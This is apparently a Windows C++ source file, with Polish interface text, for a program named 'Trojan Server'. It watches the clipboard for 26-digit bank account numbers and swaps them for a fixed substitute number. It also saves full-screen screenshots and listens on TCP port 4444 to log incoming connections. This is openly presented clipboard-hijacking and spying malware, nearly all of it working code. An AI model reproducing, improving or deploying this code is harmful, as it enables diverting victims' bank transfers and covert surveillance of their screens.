#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <thread>
#include <vector>
#include <string>
#include <sstream>
#include <cctype>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")

#define ID_LOG 1001
#define ID_BUTTON_CHANGE 1002
#define ID_BUTTON_STATUS_CHANGE 1003
#define ID_BUTTON_SCREENSHOT 1004

const int PORT = 4444;
HWND hLog;
HWND hStatus;

using namespace std;

void LogMessage(const string& msg) {
    string current;
    int len = GetWindowTextLength(hLog);
    if (len > 0) {
        char* buffer = new char[len + 1];
        GetWindowText(hLog, buffer, len + 1);
        current = buffer;
        delete[] buffer;
    }
    current += msg + "\r\n";
    SetWindowText(hLog, current.c_str());
}

bool Is26Digits(const char* text) {
    if (strlen(text) != 26) return false;
    for (size_t i = 0; i < 26; ++i) {
        if (!isdigit(text[i])) return false;
    }
    return true;
}

void ClipboardWatcher() {
    string lastDetectedNumber;

    while (true) {
        if (IsClipboardFormatAvailable(CF_TEXT)) {
            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* pszText = static_cast<char*>(GlobalLock(hData));
                    if (pszText && Is26Digits(pszText)) {
                        string current(pszText);
                        if (current != lastDetectedNumber) {
                            lastDetectedNumber = current;
                            LogMessage("Wykryto nowy numer konta w schowku.");
                        }
                    } else {
                        lastDetectedNumber.clear();
                    }
                    GlobalUnlock(hData);
                }
                CloseClipboard();
            }
        }
        Sleep(100);
    }
}

void ClientHandler(SOCKET clientSocket, sockaddr_in clientAddr) {
    char* ip = inet_ntoa(clientAddr.sin_addr);
    stringstream ss;
    ss << "Polaczono: " << ip;
    LogMessage(ss.str());

    char buffer[512];
    while (true) {
        int bytes = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) break;

        buffer[bytes] = '\0';
        stringstream srecv;
        srecv << "[<] " << ip << ": " << buffer;
        LogMessage(srecv.str());
    }

    closesocket(clientSocket);
    LogMessage("Rozlaczono klienta.");
}

void InitServerSocket() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET server = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(server, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(server, SOMAXCONN);

    SetWindowText(hStatus, "Status: Serwer nasluchuje");
    LogMessage("Serwer nasluchuje...");

    while (true) {
        sockaddr_in clientAddr;
        int clientSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(server, (sockaddr*)&clientAddr, &clientSize);
        thread(ClientHandler, clientSocket, clientAddr).detach();
    }

    closesocket(server);
    WSACleanup();
}

void ReplaceClipboardAccount() {
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText && Is26Digits(pszText)) {
                EmptyClipboard();
                const char* newText = "111122223333444455556666";
                HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, strlen(newText) + 1);
                memcpy(GlobalLock(hGlob), newText, strlen(newText) + 1);
                GlobalUnlock(hGlob);
                SetClipboardData(CF_TEXT, hGlob);
                LogMessage("Podmieniono nr konta na: 111122223333444455556666");
            } else {
                LogMessage("Nie znaleziono 26 cyfr w schowku.");
            }
            GlobalUnlock(hData);
        }
        CloseClipboard();
    }
}

void CaptureScreenshotToFile() {
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);

    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hScreen);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = -bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = bmp.bmWidth * 4 * bmp.bmHeight;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);

    GetDIBits(hDC, hBitmap, 0, (UINT)bmp.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    CreateDirectoryA("images", NULL);
    SYSTEMTIME st;
    GetLocalTime(&st);
    char filename[MAX_PATH];
    sprintf_s(filename, "images\\img_%04d%02d%02d_%02d%02d%02d.png",
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    DWORD dwWritten;

    bmfHeader.bfOffBits = dwSize;
    bmfHeader.bfSize = dwSize + dwBmpSize;
    bmfHeader.bfType = 0x4D42;

    WriteFile(hFile, &bmfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, lpbitmap, dwBmpSize, &dwWritten, NULL);

    CloseHandle(hFile);
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    DeleteObject(hBitmap);
    DeleteDC(hDC);

    LogMessage(string("Zapisano zrzut ekranu do: ") + filename);
}
//12345678912345678912345678
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            hLog = CreateWindowEx(WS_EX_CLIENTEDGE, "EDIT", "",
                WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
                10, 10, 560, 300, hwnd, (HMENU)ID_LOG, GetModuleHandle(NULL), NULL);

            hStatus = CreateWindowEx(0, "STATIC", "Status: Serwer nieaktywny",
                WS_CHILD | WS_VISIBLE,
                10, 320, 300, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);

            CreateWindowEx(0, "BUTTON", "Podmien Nr Konta",
                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                10, 350, 200, 30, hwnd, (HMENU)ID_BUTTON_CHANGE, GetModuleHandle(NULL), NULL);

            CreateWindowEx(0, "BUTTON", "Zrob Zrzut Ekranu",
                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                220, 350, 200, 30, hwnd, (HMENU)ID_BUTTON_SCREENSHOT, GetModuleHandle(NULL), NULL);

            thread(ClipboardWatcher).detach();
            thread(InitServerSocket).detach();
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == ID_BUTTON_CHANGE || LOWORD(wParam) == ID_BUTTON_STATUS_CHANGE) {
                ReplaceClipboardAccount();
            } else if (LOWORD(wParam) == ID_BUTTON_SCREENSHOT) {
                CaptureScreenshotToFile();
            }
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "TrojanServerClass";

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, "TrojanServerClass", "Trojan Server",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 600, 420,
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
